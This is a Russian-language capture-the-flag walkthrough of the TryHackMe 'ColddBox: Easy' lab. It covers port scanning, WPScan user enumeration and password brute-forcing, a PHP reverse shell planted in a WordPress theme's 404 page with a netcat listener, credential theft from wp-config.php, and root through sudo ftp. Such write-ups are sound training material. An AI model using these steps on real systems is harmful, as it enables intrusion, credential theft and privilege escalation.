# ColddBox: Easy

- https://tryhackme.com/room/colddboxeasy
- 
## Разведка

Сканируем сеть
nmap -sC -sV
- Стандартные скрипты
- Cканирование версий

```
└─$ nmap -sC -sV 10.80.131.247  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 21:17 +0300
Nmap scan report for 10.80.131.247
Host is up (0.079s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.1.31
|_http-title: ColddBox | One more machine

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds
                                                                    

```

Теперь прошуршим все порты используя флаг -p- и -v для отображения процесса сканирования
```                       
└─$ nmap -p- 10.80.131.247 -v 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 21:18 +0300
Initiating Ping Scan at 21:18
Scanning 10.80.131.247 [4 ports]
Completed Ping Scan at 21:18, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:18
Completed Parallel DNS resolution of 1 host. at 21:18, 0.50s elapsed
Initiating SYN Stealth Scan at 21:18
Scanning 10.80.131.247 [65535 ports]
Discovered open port 80/tcp on 10.80.131.247
SYN Stealth Scan Timing: About 17.79% done; ETC: 21:20 (0:02:23 remaining)
SYN Stealth Scan Timing: About 34.33% done; ETC: 21:21 (0:01:57 remaining)
SYN Stealth Scan Timing: About 50.60% done; ETC: 21:21 (0:01:29 remaining)
SYN Stealth Scan Timing: About 65.06% done; ETC: 21:21 (0:01:05 remaining)
Discovered open port 4512/tcp on 10.80.131.247
Completed SYN Stealth Scan at 21:20, 173.27s elapsed (65535 total ports)
Nmap scan report for 10.80.131.247
Host is up (0.080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
4512/tcp open  unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 173.97 seconds
           Raw packets sent: 66534 (2.927MB) | Rcvd: 66349 (2.666MB)
                                                                                          
```

80 уже есть поэтому точечно проверим 4512 с фагом -p 4512
```
└─$ nmap -sC -sV -p 4512 10.80.131.247
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 21:59 +0300
Nmap scan report for 10.80.131.247
Host is up (0.082s latency).

PORT     STATE SERVICE VERSION
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.42 seconds
```
Окей, это просто ssh, только на другом порту

Главная страница
<img width="1467" height="672" alt="Снимок экрана 2026-01-30 в 14 09 51" src="https://github.com/user-attachments/assets/29ee8a79-283b-4369-a31e-8d5c309a3478" />

Коментарии
<img width="1467" height="672" alt="Снимок экрана 2026-01-30 в 14 10 18" src="https://github.com/user-attachments/assets/6b699b3e-6849-4313-b05d-119a842dabe1" />

Форма для коментов
<img width="1467" height="718" alt="Снимок экрана 2026-01-30 в 14 10 48" src="https://github.com/user-attachments/assets/1bc1cc74-2483-4797-8fb5-2c107dd28b34" />

Вход для пользователя
<img width="1467" height="718" alt="Снимок экрана 2026-01-30 в 14 11 14" src="https://github.com/user-attachments/assets/b6349e50-0654-43f6-b5da-84a07d3166a7" />

В глаза бросаются сразу 2 вещи
1. Форма в которой ниже говорится о возможности использования HTML тегов и теоретически можно бахнуть XSS
2. WP

Для начала запущу WP-scan
```
└─$ wpscan --url http://10.80.174.7 -e vp,vt,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.80.174.7/ [10.80.174.7]
[+] Started: Fri Jan 30 14:19:10 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.80.174.7/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.80.174.7/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.80.174.7/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.80.174.7/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.80.174.7/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.80.174.7/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.80.174.7/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.1
 | Style URL: http://10.80.174.7/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.80.174.7/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:12 <=================> (652 / 652) 100.00% Time: 00:00:12
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] username
 | Found By: Rss Generator (Passive Detection)

[+] username
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] username
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] username
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 30 14:19:29 2026
[+] Requests Done: 711
[+] Cached Requests: 10
[+] Data Sent: 181.87 KB
[+] Data Received: 353.995 KB
[+] Memory used: 277.125 MB
[+] Elapsed time: 00:00:19
```

```
WordPress version 4.1.31 
```

Когда я узнал версию я сразу пошел искать CVE на нее, но сразу скажу что их было довольно много, была и хранимая XSS в коментариях которые читает адиин перед отправкой, но на этом стф никто не читал, поэтому это тут не сработает. Также много уязвмостей уже в самой CMS после входа. Есть уязвимость через сбор пароля, и тк мы уже знаем именя пользователей, то можно это попробовать, но я лучше попробую грубо перебрать пароли, через гидру у меня че то не получалось и я узнал что можно брутить сразу через wpscan такой командой:

## USER
```
wpscan --url http://10.80.174.7/ --passwords rockyou.txt
```

Ждем когда что-то найдется

```
[SUCCESS] - c0ldd / [REDACTED]
```
Отлично! 

<img width="1467" height="718" alt="Pasted image 20260130144427" src="https://github.com/user-attachments/assets/2da7c8e2-4b50-416e-ad74-cf619ed66529" />

И мы внутри панели! Пока смотрю что тут есть и куда можно закинуть реверс шелл или тп

Тут можно и без CVE придумать, куда закинуть скрипт.
Во вкладке Appearance -> Edit можно редактировать разные страницы, например страницу 404.php. Эта страница будет открываться при получении 404 - Страница не найдена. Давайте изменим код страницы:

<img width="1464" height="718" alt="Pasted image 20260130145942" src="https://github.com/user-attachments/assets/a648a18a-4efa-4551-a6b5-4bb30ec8d16d" />

Закинем этот скрипт на страницу и поменяем свой ip и порт. 
```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

Свой ip для TryHackMe можно взять командой `ip a`. 

Откроем у себя соответствующий порт
```
└─$ nc -lvnp 4444                     
listening on [any] 4444 ...
Сохраняем и теперь если мы перейдем по ссылке
```

И теперь если мы перейдем по несуществующей ссылке на атакуемом сайте, например:
```
http://10.80.174.7/?p=2
```

То наш скрипт сработает и мы получим наш шелл:
```
└─$ nc -lvnp 4444                     
listening on [any] 4444 ...
connect to [192.168.155.3] from (UNKNOWN) [10.80.174.7] 39836
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:58:55 up 57 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Тут я полазил по системе, поискал всякое и вспомнил про wp-config.php 
```
www-data@ColddBox-Easy:/var/www/html$ ls
ls
hidden           wp-blog-header.php    wp-includes        wp-signup.php
index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
license.txt      wp-config-sample.php  wp-load.php        xmlrpc.php
readme.html      wp-config.php         wp-login.php
wp-activate.php  wp-content            wp-mail.php
wp-admin         wp-cron.php           wp-settings.php
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', '[REDACTED]');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'o[eR&,8+wPcLpZaE<ftDw!{,@U:p]_hc5L44E]Q/wgW,M==DB$dUdl_K1,XL/+4{');
define('SECURE_AUTH_KEY',  'utpu7}u9|FEi+3`RXVI+eam@@vV8c8x-ZdJ-e,mD<6L6FK)2GS }^:6[3*sN1f+2');
define('LOGGED_IN_KEY',    '9y<{{<I-m4$q-`4U5k|zUk/O}HX dPj~Q)<>#7yl+z#rU60L|Nm-&5uPPB(;^Za+');
define('NONCE_KEY',        'ZpGm$3g}3+qQU_i0E<MX_&;B_3-!Z=/:bqy$&[&7u^sjS!O:Yw;D.|$F9S4(&@M?');
define('AUTH_SALT',        'rk&S:6Wls0|nqYoCBEJls`FY(NhbeZ73&|1i&Zach?nbqCm|CgR0mmt&=gOjM[.|');
define('SECURE_AUTH_SALT', 'X:-ta$lAW|mQA+,)/0rW|3iuptU}v0fj[L^H6v|gFu}qHf4euH9|Y]:OnP|pC/~e');
define('LOGGED_IN_SALT',   'B9%hQAayJt:RVe+3yfx/H+:gF/#&.+`Q0c{y~xn?:a|sX5p(QV5si-,yBp|FEEPG');
define('NONCE_SALT',       '3/,|<&-`H)yC6U[oy{`9O7k)q4hj8x/)Qu_5D/JQ$-)r^~8l$CNTHz^i]HN-%w-g');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

define('WP_HOME', '/');
define('WP_SITEURL', '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: 

c0ldd@ColddBox-Easy:/var/www/html$ 
```

Отлично! Мы получили пароль пользователя c0ldd повысили до него свои привилегии

Читаем флаг
```
c0ldd@ColddBox-Easy:/var/www/html$ cd /home/c0ldd
cd /home/c0ldd
c0ldd@ColddBox-Easy:~$ cat user.txt
cat user.txt
```
## ROOT 
Тут я сначала прокинул linpeas, а потом вспомнил что не посмотрел sudo -l тк уже есть пароль то можно:
```
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: 
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

Ну это вообще халява полная, 2 команды и у нас root
```
c0ldd@ColddBox-Easy:~$ sudo ftp
ftp> !/bin/bash
root@ColddBox-Easy:~# id
```

Можно было так же повысить права через /usr/bin/vim, так же linpeas нашел много CVE, поэтому способов повышения привилегий тут очень много

Ну и читаем наш флаг:
```
root@ColddBox-Easy:~# cat /root/root.txt
[REDACTED]
```
